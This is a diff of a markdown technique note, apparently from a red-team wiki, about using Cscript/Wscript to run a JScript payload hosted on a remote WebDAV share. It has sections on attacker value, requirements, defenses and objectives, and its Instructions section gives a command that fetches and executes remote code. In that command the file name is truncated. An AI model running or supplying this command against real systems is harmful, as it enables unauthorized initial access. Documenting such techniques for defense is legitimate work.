@@ -33,11 +33,15 @@ Technical explanation: Cscript and Wscript are included in Windows as part of th
 
 Business value: This technique can be used by attackers to gain initial access to a target network. Once an attacker has a foothold in a network, they can move laterally to find valuable data or escalate privileges to gain further access to the network.
 
+ 
+
 ## Requirements
 
 1. Access to a target system with Cscript or Wscript installed
 
 1. A JScript payload hosted on a remote server
+
+ 
 
 ## Defense
 
@@ -47,17 +51,27 @@ Business value: This technique can be used by attackers to gain initial access t
 
 1. Monitor network traffic for suspicious connections to remote servers
 
+ 
+
 ## Objectives
 
 1. Download and execute a payload on a target system
 
 1. Gain initial access to a target network
 
+ 
+
 # Instructions
 
 1. To execute the JScript payload, run the following command in a PowerShell terminal:
 
+ 
+
+
+
 **Code**: [[cscript //E:jscript \\webdavserver\folder\payload.]]
+
+
 
 > This command will execute a JScript payload located at \\webdavserver\folder\payload.txt using the cscript command-line tool. The //E:jscript parameter specifies that the script should be executed using the JScript scripting engine. This command can be used to execute arbitrary code on a remote system and should only be used for authorized and legitimate purposes.
 
@@ -79,3 +93,5 @@ Business value: This technique can be used by attackers to gain initial access t
 
 - [[Cscript / Wscript]]
 - [[Windows - Download and execute methods]]
+
+
